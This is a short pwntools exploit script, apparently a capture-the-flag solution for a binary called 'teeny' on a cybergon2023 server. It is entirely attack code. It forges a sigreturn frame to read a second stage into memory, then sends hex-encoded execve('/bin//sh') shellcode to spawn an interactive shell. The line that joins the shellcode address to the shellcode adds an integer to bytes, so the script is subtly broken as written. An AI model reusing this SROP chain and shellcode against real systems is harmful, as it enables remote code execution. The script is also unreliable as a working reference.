#!/usr/bin/python3

from pwn import *

exe = ELF('teeny', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000040015

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('cybergon2023.webhop.me', 5004)
else:
        p = process(exe.path)

GDB()
syscall = 0x0000000000040015
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x402c0
frame.rdx = 0xa00
frame.rsp = 0x402c0
frame.rip = syscall

payload = p64(0) + p64(0x0000000000040018) + p64(0xf) + p64(syscall)
payload += bytes(frame)
s(payload)
input("send shellcode")
shellcode_address = 0x402c0+8
sl(shellcode_address + b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05")
p.interactive()
